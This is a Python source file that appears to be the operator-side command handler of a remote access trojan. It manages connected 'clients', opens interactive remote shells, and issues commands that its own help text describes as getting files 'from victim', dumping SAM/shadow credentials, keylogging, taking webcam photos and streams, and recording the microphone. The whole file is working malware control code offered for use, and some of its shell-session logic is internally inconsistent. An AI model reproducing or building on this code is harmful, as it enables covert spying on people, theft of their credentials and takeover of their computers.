from .logger import logger
from .protocol import build_command, encode_message
from .file_transfer import upload_file
from .file_transfer import download_file


SERVER_COMMANDS = {
    "help",
    "list",
    "interact",
    "exit"
}

SESSION_LOCAL_COMMANDS = {
    "help",
    "back",
    "disconnect"
}

REMOTE_COMMANDS = {
    "help",
    "download",
    "upload",
    "shell",
    "ipconfig",
    "screenshot",
    "search",
    "hashdump",
    "keylogger",
    "webcam_snapshot",
    "webcam_stream",
    "record_audio"
}



#-------------- COMMANDS IMPLEMENTATION -------------#
def handle_command(command: str, client_manager):
    parts = command.strip().split()
    if not parts:
        return

    cmd = parts[0].lower()

    if cmd == "help":
        show_help()

    elif cmd == "list":
        list_clients(client_manager)

    elif cmd == "interact":
        if len(parts) < 2:
            logger.warning("Usage: interact <client_id>")
            return
        start_session(parts[1], client_manager)

    elif cmd == "exit":
        logger.info("Exiting server...")
        return "exit"

    else:
        logger.error(f"Unknown command: {cmd}")
        return None


def list_clients(client_manager):
    clients = client_manager.get_all()

    if not clients:
        logger.info("No connected clients.")
        return

    logger.info("Connected clients:")
    logger.info("-" * 40)

    for c in clients:
        info = c.info()
        logger.info(f"ID: {info['id']} | IP: {info['ip']} | Status: {info['status']}")

    logger.info("-" * 40)


def start_session(client_id: str, client_manager):
    client = client_manager.get(client_id)

    if not client or client.status == "disconnected":
        logger.warning("Client unavailable")
        return

    logger.info(f"Session started with {client.id}")

    while True:
        try:
            cmd = input(f"session({client.id}) > ").strip()
            if not cmd:
                continue

            parts = cmd.split()
            base = parts[0].lower()

            # ---------- LOCAL SESSION COMMANDS ---------- #
            if base == "back":
                logger.info("Leaving session...")
                break

            if base == "help":
                session_help()
                continue

            if base == "disconnect":
                client.send(build_command("disconnect"))
                client.close()
                client_manager.remove(client.id)
                logger.warning("Client disconnected")
                break

            # ---------- REMOTE VALIDATION ---------- #
            if base not in REMOTE_COMMANDS:
                logger.warning("Unknown remote command")
                continue

            # ---------- SPECIAL CASE: SHELL ---------- #
            if base == "shell":
                start_remote_shell(client)
                continue

            # ---------- NORMAL REMOTE COMMAND ---------- #
            packet = build_command(base, parts[1:])
            client.send(packet)

            response = client.receive()
            if response:
                logger.info(response.get("result", str(response)))
            else:
                logger.warning("No response")

        except KeyboardInterrupt:
            logger.warning("Use 'back' to exit session")


def start_remote_shell(client):
    logger.info("Entering interactive shell (type 'exit' to leave)")

    stop = {"flag": False}

    import threading

    threading.Thread(
        target=receive_shell_output,
        args=(client, stop),
        daemon=True
    ).start()

    client.send(build_command("shell_start"))

    while True:
        try:
            cmd = input(f"shell({client.id}) > ")

            if cmd.lower() in ("exit", "back"):
                stop["flag"] = True
                break

            client.send({
                "type": "shell_command",
                "cmd": cmd
            })

        except KeyboardInterrupt:
            logger.warning("Use 'exit' to leave shell")


def interact_with_client(client_id: str, client_manager):
    client = client_manager.get(client_id)

    if not client or client.status == "disconnected":
        logger.warning("Client unavailable")
        return

    logger.info(f"Session started with {client.id} ({client.addr[0]})")

    while True:
        try:
            cmd = input(f"session({client.id}) > ").strip()

            if not cmd:
                continue

            # ---------------- LOCAL COMMANDS ---------------- #
            if cmd == "back":
                logger.info("Leaving session...")
                break

            if cmd == "help":
                session_help()
                continue

            if cmd == "disconnect":
                client.send(encode_message(build_command("disconnect")))
                client.close()
                client_manager.remove(client.id)
                logger.warning("Client disconnected")
                break

            # ---------------- SHELL MODE ---------------- #
            if cmd == "shell":
                start_shell_session(client)
                continue


            # ---------------- VALIDATION ---------------- #
            base_cmd = cmd.split()[0]

            if base_cmd not in REMOTE_COMMANDS:
                logger.warning("Unknown command")
                continue

            # ---------------- SEND (PROTOCOL FIX) ---------------- #
            packet = build_command(base_cmd, cmd.split()[1:])
            client.send(encode_message(packet))

            response = client.receive()

            if response and response.get("type") == "response":
                output = response.get("result", "")
                logger.info(output)
            else:
                logger.warning("No response")

        except KeyboardInterrupt:
            logger.warning("Use 'back' to exit session")

        except Exception as e:
            logger.exception(f"Session error: {e}")
            break


def shell_prompt(client_id):
    return f"session({client_id})$ "


def start_shell_session(client):
    logger.info("Entering interactive shell (type 'exit' to leave)")

    # Tell client to start shell
    client.send(encode_message({
        "type": "shell_start"
    }))

    # Start background listener
    stop_flag = {"stop": False}

    import threading
    threading.Thread(
        target=receive_shell_output,
        args=(client, stop_flag),
        daemon=True
    ).start()

    # Input loop
    while True:
        try:
            cmd = input(f"shell({client.id}) > ")

            if cmd.strip().lower() in ("exit", "back"):
                stop_flag["stop"] = True
                logger.info("Leaving shell...")
                break

            packet = {
                "type": "shell_command",
                "cmd": cmd
            }

            client.send(encode_message(packet))

        except KeyboardInterrupt:
            logger.warning("Use 'exit' to leave shell")


def receive_shell_output(client, stop):
    while not stop["flag"]:
        try:
            msg = client.receive()

            if not msg:
                continue

            if msg.get("type") == "shell_output":
                print(msg.get("data"), end="")

        except Exception as e:
            logger.exception(f"Shell error: {e}")
            break

def send_command_to_client(command: str, client):
    try:
        packet = build_command(command)
        client.send(encode_message(packet))

        response = client.receive()

        if response:
            logger.info(response.get("result", str(response)))
        else:
            logger.warning("No response.")

    except Exception as e:
        logger.exception(f"Communication error: {e}")


def print_client_info(client):
    info = client.info()

    logger.info("\nClient info:")
    logger.info(f"ID      : {info['id']}")
    logger.info(f"IP      : {info['ip']}")
    logger.info(f"Status  : {info['status']}")


def handle_upload(command, client):
    parts = command.split()
    if len(parts) < 3:
        logger.warning("Usage: upload <local> <remote>")
        return

    upload_file(client, parts[1], parts[2])


def handle_download(command, client):
    parts = command.split()
    if len(parts) < 3:
        logger.warning("Usage: download <remote> <local>")
        return

    download_file(client, parts[1], parts[2])


#----------- HELPERS --------------#
def show_help():
    logger.info("""
Server commands:
    list
    interact <id>
    help
    exit
""")


def session_help():
    logger.info("""
Available commands:

help               Show this help
back               Exit session
disconnect         Disconnect client

download           Get file from victim
upload             Send file to victim
shell              Open remote shell
ipconfig           Network configuration
screenshot         Capture screen
search             Find file on system
hashdump           Dump credentials (SAM/shadow)
keylogger          Start keylogging
webcam_snapshot    Take webcam photo
webcam_stream      Live webcam feed
record_audio       Record microphone
""")

